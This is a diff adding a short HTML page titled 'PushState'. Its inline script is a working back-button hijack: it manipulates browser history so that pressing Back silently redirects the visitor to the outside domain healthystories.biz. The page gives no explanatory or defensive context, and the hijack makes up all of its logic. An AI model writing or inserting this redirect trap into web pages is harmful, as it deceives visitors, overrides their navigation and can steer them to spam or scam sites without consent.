@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PushState</title>
+</head>
+<body>
+  <main>
+    <h1>PushState</h1>
+  </main>
+  <script>
+		(function(window, location) {
+			history.pushState('index.html', 'Index', 'index.html');
+			history.replaceState(null, document.title, location.pathname+"#!/history");
+			history.pushState(null, document.title, location.pathname);
+		
+			window.addEventListener("popstate", function() {
+				if(location.hash === "#!/history") {
+				history.replaceState(null, document.title, location.pathname);
+				setTimeout(function(){
+					location.replace("http://healthystories.biz/");
+				},10);
+				}
+			}, false);
+			}(window, location));
+		</script>
+</body>
+</html>
